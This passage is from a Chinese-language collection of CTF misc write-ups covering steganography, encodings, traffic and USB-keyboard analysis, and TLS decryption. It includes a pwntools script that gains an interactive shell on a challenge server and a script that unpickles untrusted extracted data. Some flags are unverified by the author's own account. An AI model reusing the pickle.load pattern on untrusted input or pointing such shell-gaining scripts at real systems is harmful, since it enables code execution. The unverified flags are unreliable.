001100010011001000110011001101000011010100110110001101110011100000
```

去除掉最后两位 00，可以转成 ASCII 字符 `12345678`。

```flag
flag{12345678}
```

### [INSHack2018]INSanity

Markdown 文档，打开即可看到 flag。

![img](assets/6daee5289267746af41e355061e8177c.png)

```flag
INSA{let_the_game_begin!}
```

### [ACTF新生赛2020]frequency

解压得到一个 word 文档，打开发现隐藏文字，同时其备注还有一串字符串(要原来的word文件才有，打开过的，修改过的会消失，所以一定要先看看属性等信息)。将其二者拼在一起，然后 base64 解码。将解码后的字符串进行字频统计。

```text
('1: ', ('a', 198))
('2: ', ('c', 194))
('3: ', ('t', 188))
('4: ', ('f', 180))
('5: ', ('p', 174))
('6: ', ('l', 170))
('7: ', ('o', 164))
('8: ', ('k', 159))
('9: ', ('m', 152))
('10: ', ('i', 145))
('11: ', ('j', 139))
('12: ', ('n', 133))
('13: ', ('u', 128))
('14: ', ('h', 116))
('15: ', ('b', 109))
('16: ', ('y', 106))
('17: ', ('g', 100))
('18: ', ('v', 92))
('19: ', ('r', 87))
('20: ', ('d', 79))
('21: ', ('x', 73))
('22: ', ('e', 68))
('23: ', ('s', 61))
('24: ', ('z', 54))
('25: ', ('w', 48))
('26: ', ('q', 41))
actf{plokmijnuhbygvrdxeszwq}
```

### greatescape(流量分析，TLS流量解密/https流量解密)

Wireshark 分析流量包，TCP 流量跟踪到流 19 可以发现 RSA 私钥，将其保存下来。

![image-20231205002717533](assets/image-20231205002717533.png)

保存下来，到key.txt, 将密钥导入 Wireshark，

编辑->首选项->protools->TLS->edit->点击±>添加key.txt

![image-20231205002849404](assets/image-20231205002849404.png)

![image-20231205002902815](assets/image-20231205002902815.png)

![image-20231205002912819](assets/image-20231205002912819.png)

![image-20231205002929837](assets/image-20231205002929837.png)



![image-20231205002948766](assets/image-20231205002948766.png)

```flag
INS{OkThatWasWay2Easy}
```

### [INSHack2019]gflag

GCode 文件，上传到[在线预览的网站](https://gcode.ws/)可以看到包含 flag 的渲染。

![image-20231207192148186](assets/image-20231207192148186.png)

```flag
INSA{3d_pr1nt3d_fl49}
```

### [GKCTF2020]Sail a boat down the river

视频中可见一个二维码，扫描后可得到一个百度网盘链接。

![image-20231207192331990](assets/image-20231207192331990.png)

```text
https://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ
```

根据视频中刷卡器的闪烁可以得出摩斯电码。

```text
-.-- .-- ---.. --.
yw8g
```

下载得到数独文件，将[数独](https://www.sudoku.name/sudoku-solver/cn)解出可得到密钥。

![img](assets/3a587844dbd737548aa76c8696b3fbb4.png)

```text
52693795149137
```

![img](assets/9c0a7947f4a83779dc20134591930365.png)

将明文作为压缩包的解压密码将其解压。使用 OverTure 打开解压出来的谱面，可找到 flag。

![img](assets/2e70827847a33f00a286bf6bf1cf3ed0.png)

```flag
flag{gkctf_is_fun}
```

### [MRCTF2020]小O的考研复试

简单 JavaScript 算一下可以得到 flag。

![image-20231207192702253](assets/image-20231207192702253.png)

```flag
flag{577302567}
```

### [QCTF2018]X-man-Keyword(Cloacked Pixel解隐写)

Cloacked Pixel 可以解出隐藏的文字。

![image-20231205003154069](assets/image-20231205003154069.png)

```text
PVSF{vVckHejqBOVX9C1c13GFfkHJrjIQeMwf}
```

使用 Nihilist 对应的解码可以得到 flag。

![image-20231205003211458](assets/image-20231205003211458.png)

```flag
QCTF{cCgeLdnrIBCX9G1g13KFfeLNsnMRdOwf}
```

### [MRCTF2020]寻找xxx（DTMF隐写）

解压得到一段 DTMF 音频，上传到在线工具得到如下内容。

![image-20231205003249156](assets/image-20231205003249156.png)

一开始以为这就是 flag，结果是要把数字发给公众号。

```flag
MRCTF{Oh!!!!!_Y0u_f1nd_my_secret}
```

### Beautiful_Side（二维码修复，调高纠错等级）

解压所得的图片末尾还有一张 PNG 图像，提取出来之后是半个二维码。先将其定位码补全。

![image-20231205003329720](assets/image-20231205003329720.png)

将其上传到 [QRazyBox](https://merricx.github.io/qrazybox/) 尝试修复二维码。在纠错等级为高，遮掩层模式为 2 的时候发现可以成功提取出 flag。

![image-20231205003352123](assets/image-20231205003352123.png)

```flag
Flag{OQWIC_4DS1A_S034S}
```

### [XMAN2018排位赛]AutoKey

Wireshark 打开发现是 USB 流量包，稍微跟一下发现跟鼠键的很像，于是用脚本提取出来。

```text
[+] Found : <CAP>a<CAP>utokey('****').decipheer('<CAP>mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexo<DEL>pze<DEL>iz')
```

整理后得到如下密文。

```text
Mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexpziz
```

使用[在线网站](http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/)提供的爆破脚本，可以解出如下内容。

```text
-674.914569565 autokey, klen 8 :"FLAGHERE", HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF
flag{JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF}
```

### [DDCTF2018]第四扩展FS（词频分析）

010 editor 打开图片发现文件末尾有未知区块。提取出来仔细甄别可以知道有一个压缩文档。

![image-20231205003424660](assets/image-20231205003424660.png)

将压缩文档提取出来，发现需要密码。在 FS.jpg 的备注中发现了字符串 `Pactera`，将其作为密码可以成功解压文档。根据文档内容可猜测需要做频次分析，于是做频次分析得到如下结果。

![img](assets/894e925b7402fa636a2c2456f686c2e0.png)

```diff
- DDCTF{huanwe1sik4o!} //我这次得到的 flag
+ DDCTF{x1n9shaNgbIci} //网上某 WriteUp 的 flag (我也不知道为什么交这个是对的)
```

### [INSHack2017]hiding-in-plain-sight

binwalk 可以发现解压出来的图片里有多张图片，于是 foremost 将其分离出来。

![img](assets/2184d78d6d465c049422bf9285d2f2de.png)

得到一张包含 flag 的图片。

![img](assets/06d15916c093a0bc1ad3caec5dd40300.jpg)

```flag
INSA{l337_h4xx0r5_c0mmun1c473_w17h_PNGs}
```

### [CFI-CTF 2018]CFI-in-Kotlin（jadx反编译apk）

> skylot/jadx: https://github.com/skylot/jadx

jadx 简单反编译附件给出的 APK，在 `com/sagold/cfievent/LoginActivity.java` 下可以找到如下代码。

```java
private static final String[] DUMMY_CREDENTIALS = {"alerionMascot@CFIUL.com:HappyFirstYear"};
```

很容易发现这个 APP 实现了登录并且登录上去就会显示 flag。既然账号密码都已经拿到了，不妨安装一下并登录。然而登录上去了也没 flag。但是代码的实现逻辑确实是这样的。

```java
@Override // android.support.v7.app.AppCompatActivity, android.support.v4.app.SupportActivity, android.support.v4.app.FragmentActivity
    public void onCreate(@Nullable Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_information);
        if (getIntent().getBooleanExtra(IS_ADMIN, false)) {
            showLoginFlag();
        }
    }
```

因此我去查了 WriteUp，其中描述如下。

> With a internet connection, the flag will appear under the CFI logo.

Fine，那么这题的 flag 可能出了点问题。

```flag
CFI{DOUMMY_creeeeeddddd_issSoFriENDlieee_QUACKKKK}
```

### [watevrCTF 2019]Polly

附件给出的是一个方程，推测其 x 为不同取值时可以求得 flag。因此写出如下代码。

```python
def CalculateX(x):
    return # 这里写方程，太长了就不贴了

for i in range(100):
    print(chr(CalculateX(i)))
```

需要注意的是，因为方程数字太大了，需要使用 sagemath 才能算出准确结果。算出前 100 位可知其中含有 flag。

```flag
watevr{polly_polynomials_youtube.com/watch?v=THNWVVn9JO0}
```

### [BSidesSF2019]thekey

简单的键盘流量分析， Leftover Capture Data 提取出来再使用 USB Keyboard Data Hacker 跑一下可得如下内容。

```
[+] Found : viim<SPACE>flaag.ttxt<RET>iTthe<SPACE>flaag<SPACE>is<SPACE>ctf<ESC>vbUuA{[my_favoritte_editor_is_vim}<ESC>hhhhhhhhhhhhhhhhhhhau<ESC>vi{U<ESC>";wq<RET>
ctf{MY_FAVOURITE_EDITOR_IS_VIM}
```

### [watevrCTF 2019]Unspaellablle(cyberchef比较文件内容的不同)

附件给出了一份脚本，稍微找一下可以发现其原本的脚本。

> https://imsdb.com/transcripts/Stargate-SG1-Children-Of-The-Gods.html

将两份脚本使用 CyberChef 进行比较即可得到 flag。

![image-20231205003907939](assets/image-20231205003907939.png)

```flag
watevr{icantspeel_tiny.cc/2qtdez}
```

### [INSHack2017]remote-multimedia-controller（套娃编码，ciphey秒了）

附件解压之后得到一个流量包，使用 Wireshark 跟踪到 TCP 流 2 可得一串 base64 字符串。

![img](assets/18392f50da022d51895a1e3880674dd9.png)

```text
Vmxkd1NrNVhVbk5qUlZKU1ltdGFjRlJYZEhOaWJFNVhWR3RPV0dKVmJEWldiR1JyV1ZkS1ZXRXphRnBpVkVaVFYycEtVMU5IUmtobFJYQlRUVmhDTmxZeFdtdGhhelZ5WWtWYWFWSlViRmRVVlZaYVRURmFjbFpyT1ZaV2JXUTJWa1pvYTFkck1YVlVhbHBoVWxack1GUlZaRXRqVmxaMVZHMTRXRkpVUlRCWFdIQkdUbGRHY2s1VmFFOVdNWEJoV1Zkek1XSldaSFJPVm1SclZsZDRXbFJWVm5wUVVUMDk=
```

使用 CyberChef 套娃解码后可得如下内容。

![image-20231205003949827](assets/image-20231205003949827.png)

```text
Good job ! You found the flag: INSA{TCP_s0ck3t_4n4lys1s_c4n_b3_fun!}
INSA{TCP_s0ck3t_4n4lys1s_c4n_b3_fun!}
```

### [GWCTF2019]math

附件给出的是一个 ELF 文件，使用 IDA 查看可以发现如下逻辑。

```c
puts("Pass 150 levels and i will give you the flag~");
puts("====================================================");
printf("Now level %d\n", (unsigned int)v9);
printf("Math problem: %d * %d - %d + %d = ??? ", v4, v5, v6, v7);
puts("Give me your answer:");
read(0, &buf, 0x80uLL);
if ( (unsigned int)strtol(&buf, 0LL, 0xA) != v5 * v4 - v6 + v7 )
{
  puts("Try again?");
  exit(0);
}
puts("Right! Continue~");
++v9;
sleep((unsigned __int64)"Right! Continue~");
}
while ( v9 <= 0x95 );
  if ( v9 != 0x96 )
  {
    puts("Wrong!");
    exit(0);
  }
puts("Congratulation!");
system("/bin/sh");
return 0;
```

因此需要连续计算正确 150 次计算题，而且需要与远程交互。因此用 pwntools 来写脚本实现。

```python
from pwn import *
process = remote('node3.buuoj.cn', 26631)
for i in range(150):
    process.recvuntil('Math problem: ')
    expression = process.recvuntil('=').decode().replace('=', '')
    expression = expression.replace(' ', '')
    expression = expression.translate(str.maketrans("+-*/", "    "))
    expression = expression.split(' ')
    print(str(expression))
    process.sendline(str(int(expression[0]) * int(expression[1]) - int(expression[2]) + int(expression[3])))
process.interactive()
flag{0e6a2af0-83e3-4fce-8535-a5bfd4c4cca9}
```

### [INSHack2018]Spreadshit（ods文件，）

附件中给出了一个 ods 文件，将其使用 Excel 打开，查找并选中全部空格,替换为其他字符，方便查看，可得 flag。

![image-20231210192937723](assets/image-20231210192937723.png)

```flag
INSA{3cf6463910edffb0}
```

### [DDCTF2018](╯°□°）╯︵ ┻━┻(16进制先移位，再转码)

题目给出的附件有如下内容。

```text
d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd
```

尝试16进制解码，发现是一些乱码，考虑到字符串本身可能经过了运算。转换其他禁止，观察看看。

![image-20231205004146061](assets/image-20231205004146061.png)

发现ASCII码没有线索，但是十进制却全部大于128，猜测需要修改十进制数据再转ASCII码

十进制数据全部 -128后，获得

```python
84, 104, 97, 116, 32, 119, 97, 115, 32, 102, 97, 115, 116, 33, 32, 84, 104, 101, 32, 102, 108, 97, 103, 32, 105, 115, 58, 32, 68, 68, 67, 84, 70, 123, 57, 50, 50, 97, 98, 57, 57, 55, 52, 97, 52, 55, 99, 100, 51, 50, 50, 99, 102, 52, 51, 98, 53, 48, 54, 49, 48, 102, 97, 101, 97, 53, 125

a = [84, 104, 97, 116, 32, 119, 97, 115, 32, 102, 97, 115, 116, 33, 32, 84, 104, 101, 32, 102, 108, 97, 103, 32, 105, 115, 58, 32, 68, 68, 67, 84, 70, 123, 57, 50, 50, 97, 98, 57, 57, 55, 52, 97, 52, 55, 99, 100, 51, 50, 50, 99, 102, 52, 51, 98, 53, 48, 54, 49, 48, 102, 97, 101, 97, 53, 125]
flag = ''
for i in range(len(a)):
    flag+=chr(a[i])
    print(flag)
```

再转字符，就出来了。

或者：

猜测最后一个字符 `0xfd` 应该与 flag 的结尾也就是 `}` 字符相对应，也就是原本应该是 `0x7d`。因此尝试将此前得到的结果减去 `0x80`，得到了如下内容。

```python
#字符串长度为134，两位为一组截取此字符串，再转换为十进制发现均大于128，都减去128后得到ASCII码转为字符即可，脚本如下
str = 'd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd'
flag = ''
for i in range(0, len(str), 2):#在range(0,len(str))中，步长为2取数，依次为：0，2，4，6...
    #print(i)
    num = int(str[i:i + 2], 16)#从16进制字符串中，每2位取出来，从 16进制转10进制
    #print(num)
    flag += chr((num) % 128)#除以128取余，得到ascii码，转字符串
print(flag)
```

```text
That was fast! The flag is: DDCTF{922ab9974a47cd322cf43b50610faea5}
```

### [SUCTF 2019]Game

可以在附件给出的代码中的 index.html 中找到如下内容。

```php
<?php echo "here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2===" ?>
```

使用 Base32 解码字符串后得到了假 flag `suctf{hAHaha_Fak3_F1ag}`，于是将分析转向图片。使用 StegSolve 可解得图片中包含的隐写内容。

![image-20231202214653805](assets/image-20231202214653805.png)

将其提取出来可以得到如下内容，推测其是 AES 加密之后的密文。

```text
U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==
```

使用之前得到的假 flag 作为 key 对密文进行 Triple DES 解密可得真正的 flag。

![image-20231205004228425](assets/image-20231205004228425.png)

```flag
suctf{U_F0und_1t}
```

### [GUET-CTF2019]虚假的压缩包(文本内容异或5)

解压附件得到真实的压缩包和虚假的压缩包。虚假的压缩包是伪加密，将其 deFlags 修改成 0 即可解压其中的文件，得到如下内容。

```text
数学题
n = 33
e = 3
解26

-------------------------
答案是
```

很容易看出这是简单的 RSA。将 $n$ 分解为 $11 \times 3$ 可得其欧拉值为 $\rho{(n)} = (11 - 1)  \times (3 - 1) = 20$，$d \times e \mod  20 \equiv 1$，算得 $d = 7.$ `pow(c,d,n) = pow(26,7,33) = 5`。因此得到了 `答案是5`。将其作为压缩包密码解压真实的压缩包。

解压得到了一张图片和一段文本。使用 010 editor 打开图片并运行 PNG 模板可以发现爆出了熟悉的 CRC Mismatch。尝试使用图片宽高爆破脚本修正宽高为 `('hex:', '0xc6', '0xf2')`，得到了如下图片。

![image-20231205004257691](assets/image-20231205004257691.png)

此时可知需要将得到的文本亦或 5，写个脚本来实现。

```python
text = open("亦真亦假", 'r').read()
result = open("result.txt", 'w')
[result.write(hex(int(i, 16) ^ 5)[2:]) for i in text]
```

使用脚本将文件中的内容处理过后再将得到的内容 `From Hex` 解码一次可以得到一个 Word 文档。将其打开后可以在文章末尾发现超出文本的红色波浪线。因此尝试将超出的部分的字体颜色调深，此时可以得到 flag。

![image-20231205004313671](assets/image-20231205004313671.png)

```flag
FLAG{_th2_7ru8_2iP_}
```

### 蜘蛛侠呀（gif时间隐写）

> 将你获得的明显信息md5加密之后以flag{xxx}的格式提交。

Wireshark 分析附件给出的流量包，跟踪 TCP 流 1 可以发现一个 `GET /no_flag.zip` 响应为 304 的请求。再分析 ICMP 协议的流量，可以发现其中包含着数据。使用 tshark `tshark -r .\out.pcap -T fields -e data > data.txt` 将其中的数据提取出来。将提取得到的数据简单处理后用 CyberChef 通过 `Unique --> From Hex` 后可以得到一个以 `$$START$$-----BEGIN CERTIFICATE-----` 开头的文件。将 `$$START$$` 去除掉之后再将证书格式以及换行去掉后解 Base64 编码，可得一个压缩文档。解压之后可得一个十分卡顿的 GIF 图片，猜测含有时间隐写。

![img](assets/2ae143eef1b256f8e3473f94f1a6179a.gif)

使用 `ImageMagick identify` 工具执行 `identify -verbose .\flag.gif` 并将结果整理后可以得到如下信息。

```text
20 50 50 20 50 50 20 50 20 50 20 20 20 50 20 20 20 20 50 50 20 50 20 50 20 50 20 50 50 50 50 50 20 20 50 50 20 20 20 50 20 50 50 50 20 50 20 20 66 66
```

将最后的两个 `66` 去除，将 `20` 替换成 0，`50` 替换成 1。再二进制转字符串可得到 `mD5_1t`。将其 MD5 一次可以得到 `f0f1003afe4ae8ce4aa8e8487a8ab3b6`。

```flag
flag{f0f1003afe4ae8ce4aa8e8487a8ab3b6}
```

### [INSHack2017]10-cl0v3rf13ld-lane-signal

修正所得附件的文件拓展名为 JPG，运行 010 editor 的模板可以很容易看到文件末尾有另外一张 PNG 文件。

![image-20231210202324170](assets/image-20231210202324170.png)

将 PNG 文件提取出来得到下图。

![image-20231210202340187](assets/image-20231210202340187.png)

![image-20231210202350986](assets/image-20231210202350986.png)

在其左下角可以发现小红点，使用摩斯电码解码可得 `HELPME`。同时在图片的末尾还能发现一个音频文件。

![img](assets/fd7e4cb22c574bfd591c00ebc0f73119.png)

将音频文件提取出来，使用 Audition 打开，可以发现明显的摩斯电码的痕迹，将其抄收下来。

![img](assets/cc60b277b158db941b2a9d3468ad4ee8.png)

```text
.. -. ... .- -.--. -- ----- .-. ..... ...-- ..--.- .-- .---- .-.. .-.. ..--.- -. ...-- ...- ...-- .-. ..--.- ....- --. ...-- -.-.-- -.--.-
```

转码后整理即可得到 flag。

```flag
INSA{M0R53_W1LL_N3V3R_4G3!}
```

### [GWCTF2019]huyao(盲水印)

附件给出了两张图，猜测是盲水印。在网上找到一段可解出的脚本。

```python
# coding=utf-8
import cv2
import numpy as np
import random
import os
from argparse import ArgumentParser
ALPHA = 5


def build_parser():
    parser = ArgumentParser()
    parser.add_argument('--original', dest='ori', required=True)
    parser.add_argument('--image', dest='img', required=True)
    parser.add_argument('--result', dest='res', required=True)
    parser.add_argument('--alpha', dest='alpha', default=ALPHA)
    return parser


def main():
    parser = build_parser()
    options = parser.parse_args()
    ori = options.ori
    img = options.img
    res = options.res
    alpha = options.alpha
    if not os.path.isfile(ori):
        parser.error("original image %s does not exist." % ori)
    if not os.path.isfile(img):
        parser.error("image %s does not exist." % img)
    decode(ori, img, res, alpha)


def decode(ori_path, img_path, res_path, alpha):
    ori = cv2.imread(ori_path)
    img = cv2.imread(img_path)
    ori_f = np.fft.fft2(ori)
    img_f = np.fft.fft2(img)
    height, width = ori.shape[0], ori.shape[1]
    watermark = (ori_f - img_f) / alpha
    watermark = np.real(watermark)
    res = np.zeros(watermark.shape)
    random.seed(height + width)
    x = range(height / 2)
    y = range(width)
    random.shuffle(x)
    random.shuffle(y)
    for i in range(height / 2):
        for j in range(width):
            res[x[i]][y[j]] = watermark[i][j]
    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])


if __name__ == '__main__':
    main()
```

使用 `python2 bwm.py --original huyao.png --image stillhuyao.png --result result.png` 可以提取出一张水印图，因此得到了 flag。

![image-20231210202641693](assets/image-20231210202641693.png)

```flag
GWHT{BWM_1s_c00l}
```

### 我爱Linux(图片尾部藏数据，trid文件类型分析，pickle反序列化，坐标转换)

附件给出的是一张图片。在其末尾可以得到一串二进制数据。选中复制，010中新建文本文件，粘贴保存fuck.txt(直接复制，在外面建立txt文件是复制不进来的)

![image-20231210210015510](assets/image-20231210210015510.png)

使用trid分析文件发现，得知是Python [Pickle](https://so.csdn.net/so/search?q=Pickle&spm=1001.2101.3001.7020)序列化数据

![image-20231210210159241](assets/image-20231210210159241.png)

使用脚本转化：

```python
import pickle
 
fp = open("1.txt", "rb+")
fw = open('2.txt', 'w')
a = pickle.load(fp)
pickle = str(a)
fw.write(pickle)
fw.close()
fp.close()
```

生成2.txt，得到一堆坐标：

```text
[[(3, 'm'), (4, '"'), (5, '"'), (8, '"'), (9, '"'), (10, '#'), (31, 'm'), (32, '"'), (33, '"'), (44, 'm'), (45, 'm'), (46, 'm'), (47, 'm'), (50, 'm'), (51, 'm'), (52, 'm'), (53, 'm'), (54, 'm'), (55, 'm'), (58, 'm'), (59, 'm'), (60, 'm'), (61, 'm'), (66, 'm'), (67, '"'), (68, '"'), (75, '#')], [(1, 'm'), (2, 'm'), (3, '#'), (4, 'm'), (5, 'm'), (10, '#'), (16, 'm'), (17, 'm'), (18, 'm'), (23, 'm'), (24, 'm'), (25, 'm'), (26, 'm'), (31, '#'), (37, 'm'), (38, 'm'), (39, 'm'), (43, '"'), (47, '"'), (48, '#'), (54, '#'), (55, '"'), (57, '"'), (61, '"'), (62, '#'), (64, 'm'), (65, 'm'), (66, '#'), (67, 'm'), (68, 'm'), (72, 'm'), (73, 'm'), (74, 'm'), (75, '#')], [(3, '#'), (10, '#'), (15, '"'), (19, '#'), (22, '#'), (23, '"'), (25, '"'), (26, '#'), (29, 'm'), (30, 'm'), (31, '"'), (36, '"'), (40, '#'), (47, 'm'), (48, '"'), (53, 'm'), (54, '"'), (59, 'm'), (60, 'm'), (61, 'm'), (62, '"'), (66, '#'), (71, '#'), (72, '"'), (74, '"'), (75, '#')], [(3, '#'), (10, '#'), (15, 'm'), (16, '"'), (17, '"'), (18, '"'), (19, '#'), (22, '#'), (26, '#'), (31, '#'), (36, 'm'), (37, '"'), (38, '"'), (39, '"'), (40, '#'), (45, 'm'), (46, '"'), (52, 'm'), (53, '"'), (61, '"'), (62, '#'), (66, '#'), (71, '#'), (75, '#')], [(3, '#'), (10, '"'), (11, 'm'), (12, 'm'), (15, '"'), (16, 'm'), (17, 'm'), (18, '"'), (19, '#'), (22, '"'), (23, '#'), (24, 'm'), (25, '"'), (26, '#'), (31, '#'), (36, '"'), (37, 'm'), (38, 'm'), (39, '"'), (40, '#'), (43, 'm'), (44, '#'), (45, 'm'), (46, 'm'), (47, 'm'), (48, 'm'), (51, 'm'), (52, '"'), (57, '"'), (58, 'm'), (59, 'm'), (60, 'm'), (61, '#'), (62, '"'), (66, '#'), (71, '"'), (72, '#'), (73, 'm'), (74, '#'), (75, '#')], [(23, 'm'), (26, '#'), (32, '"'), (33, '"')], [(24, '"'), (25, '"')], [], [(12, '#'), (17, 'm'), (18, '"'), (19, '"'), (23, 'm'), (24, 'm'), (25, 'm'), (26, 'm'), (33, '#'), (36, 'm'), (37, 'm'), (38, 'm'), (39, 'm'), (40, 'm'), (41, 'm'), (46, 'm'), (47, 'm'), (52, 'm'), (53, 'm'), (54, 'm'), (65, 'm'), (66, 'm'), (67, 'm'), (68, 'm'), (71, 'm'), (72, 'm'), (73, 'm'), (74, 'm'), (75, 'm'), (76, 'm')], [(2, 'm'), (3, 'm'), (4, 'm'), (9, 'm'), (10, 'm'), (11, 'm'), (12, '#'), (15, 'm'), (16, 'm'), (17, '#'), (18, 'm'), (19, 'm'), (22, '"'), (26, '"'), (27, '#'), (30, 'm'), (31, 'm'), (32, 'm'), (33, '#'), (40, '#'), (41, '"'), (45, 'm'), (46, '"'), (47, '#'), (50, 'm'), (51, '"'), (55, '"'), (58, 'm'), (59, 'm'), (60, 'm'), (64, '#'), (65, '"'), (68, '"'), (69, 'm'), (75, '#'), (76, '"')], [(1, '#'), (2, '"'), (5, '#'), (8, '#'), (9, '"'), (11, '"'), (12, '#'), (17, '#'), (24, 'm'), (25, 'm'), (26, 'm'), (27, '"'), (29, '#'), (30, '"'), (32, '"'), (33, '#'), (39, 'm'), (40, '"'), (44, '#'), (45, '"'), (47, '#'), (50, '#'), (51, 'm'), (52, '"'), (53, '"'), (54, '#'), (55, 'm'), (57, '#'), (58, '"'), (61, '#'), (64, '#'), (65, 'm'), (68, 'm'), (69, '#'), (74, 'm'), (75, '"')], [(1, '#'), (2, '"'), (3, '"'), (4, '"'), (5, '"'), (8, '#'), (12, '#'), (17, '#'), (26, '"'), (27, '#'), (29, '#'), (33, '#'), (38, 'm'), (39, '"'), (43, '#'), (44, 'm'), (45, 'm'), (46, 'm'), (47, '#'), (48, 'm'), (50, '#'), (55, '#'), (57, '#'), (58, '"'), (59, '"'), (60, '"'), (61, '"'), (65, '"'), (66, '"'), (67, '"'), (69, '#'), (73, 'm'), (74, '"')], [(1, '"'), (2, '#'), (3, 'm'), (4, 'm'), (5, '"'), (8, '"'), (9, '#'), (10, 'm'), (11, '#'), (12, '#'), (17, '#'), (22, '"'), (23, 'm'), (24, 'm'), (25, 'm'), (26, '#'), (27, '"'), (29, '"'), (30, '#'), (31, 'm'), (32, '#'), (33, '#'), (37, 'm'), (38, '"'), (47, '#'), (51, '#'), (52, 'm'), (53, 'm'), (54, '#'), (55, '"'), (57, '"'), (58, '#'), (59, 'm'), (60, 'm'), (61, '"'), (64, '"'), (65, 'm'), (66, 'm'), (67, 'm'), (68, '"'), (72, 'm'), (73, '"')], [], [], [], [(5, '#'), (8, '#'), (16, 'm'), (17, 'm'), (18, 'm'), (19, 'm'), (23, 'm'), (24, 'm'), (25, 'm'), (26, 'm'), (30, 'm'), (31, 'm'), (32, 'm'), (33, 'm'), (38, 'm'), (39, 'm'), (40, 'm'), (50, '#'), (57, '#'), (64, '#'), (71, 'm'), (72, 'm'), (73, 'm')], [(2, 'm'), (3, 'm'), (4, 'm'), (5, '#'), (8, '#'), (9, 'm'), (10, 'm'), (11, 'm'), (15, '#'), (16, '"'), (19, '"'), (20, 'm'), (22, 'm'), (23, '"'), (26, '"'), (27, 'm'), (29, '#'), (34, '#'), (36, 'm'), (37, '"'), (41, '"'), (44, 'm'), (45, 'm'), (46, 'm'), (50, '#'), (51, 'm'), (52, 'm'), (53, 'm'), (57, '#'), (58, 'm'), (59, 'm'), (60, 'm'), (64, '#'), (65, 'm'), (66, 'm'), (67, 'm'), (73, '#')], [(1, '#'), (2, '"'), (4, '"'), (5, '#'), (8, '#'), (9, '"'), (11, '"'), (12, '#'), (15, '#'), (16, 'm'), (19, 'm'), (20, '#'), (22, '#'), (25, 'm'), (27, '#'), (29, '"'), (30, 'm'), (31, 'm'), (32, 'm'), (33, 'm'), (34, '"'), (36, '#'), (37, 'm'), (38, '"'), (39, '"'), (40, '#'), (41, 'm'), (43, '#'), (44, '"'), (47, '#'), (50, '#'), (51, '"'), (53, '"'), (54, '#'), (57, '#'), (58, '"'), (60, '"'), (61, '#'), (64, '#'), (65, '"'), (67, '"'), (68, '#'), (73, '#')], [(1, '#'), (5, '#'), (8, '#'), (12, '#'), (16, '"'), (17, '"'), (18, '"'), (20, '#'), (22, '#'), (27, '#'), (29, '#'), (33, '"'), (34, '#'), (36, '#'), (41, '#'), (43, '#'), (44, '"'), (45, '"'), (46, '"'), (47, '"'), (50, '#'), (54, '#'), (57, '#'), (61, '#'), (64, '#'), (68, '#'), (73, '#')], [(1, '"'), (2, '#'), (3, 'm'), (4, '#'), (5, '#'), (8, '#'), (9, '#'), (10, 'm'), (11, '#'), (12, '"'), (15, '"'), (16, 'm'), (17, 'm'), (18, 'm'), (19, '"'), (23, '#'), (24, 'm'), (25, 'm'), (26, '#'), (29, '"'), (30, '#'), (31, 'm'), (32, 'm'), (33, 'm'), (34, '"'), (37, '#'), (38, 'm'), (39, 'm'), (40, '#'), (41, '"'), (43, '"'), (44, '#'), (45, 'm'), (46, 'm'), (47, '"'), (50, '#'), (51, '#'), (52, 'm'), (53, '#'), (54, '"'), (57, '#'), (58, '#'), (59, 'm'), (60, '#'), (61, '"'), (64, '#'), (65, '#'), (66, 'm'), (67, '#'), (68, '"'), (71, 'm'), (72, 'm'), (73, '#'), (74, 'm'), (75, 'm')], [], [], [], [(2, 'm'), (3, 'm'), (4, 'm'), (5, 'm'), (8, 'm'), (9, 'm'), (10, 'm'), (11, 'm'), (12, 'm'), (19, '#'), (24, 'm'), (25, 'm'), (26, 'm'), (29, '"'), (30, '"'), (31, 'm')], [(1, '#'), (2, '"'), (5, '"'), (6, 'm'), (8, '#'), (16, 'm'), (17, 'm'), (18, 'm'), (19, '#'), (22, 'm'), (23, '"'), (27, '"'), (31, '#')], [(1, '#'), (2, 'm'), (5, 'm'), (6, '#'), (8, '"'), (9, '"'), (10, '"'), (11, '"'), (12, 'm'), (13, 'm'), (15, '#'), (16, '"'), (18, '"'), (19, '#'), (22, '#'), (23, 'm'), (24, '"'), (25, '"'), (26, '#'), (27, 'm'), (31, '"'), (32, 'm'), (33, 'm')], [(2, '"'), (3, '"'), (4, '"'), (6, '#'), (13, '#'), (15, '#'), (19, '#'), (22, '#'), (27, '#'), (31, '#')], [(1, '"'), (2, 'm'), (3, 'm'), (4, 'm'), (5, '"'), (8, '"'), (9, 'm'), (10, 'm'), (11, 'm'), (12, '#'), (13, '"'), (15, '"'), (16, '#'), (17, 'm'), (18, '#'), (19, '#'), (23, '#'), (24, 'm'), (25, 'm'), (26, '#'), (27, '"'), (31, '#')], [(29, '"'), (30, '"')]]
```

发现其好像是坐标对应得关系，于是写个脚本将其对应出来。

```python
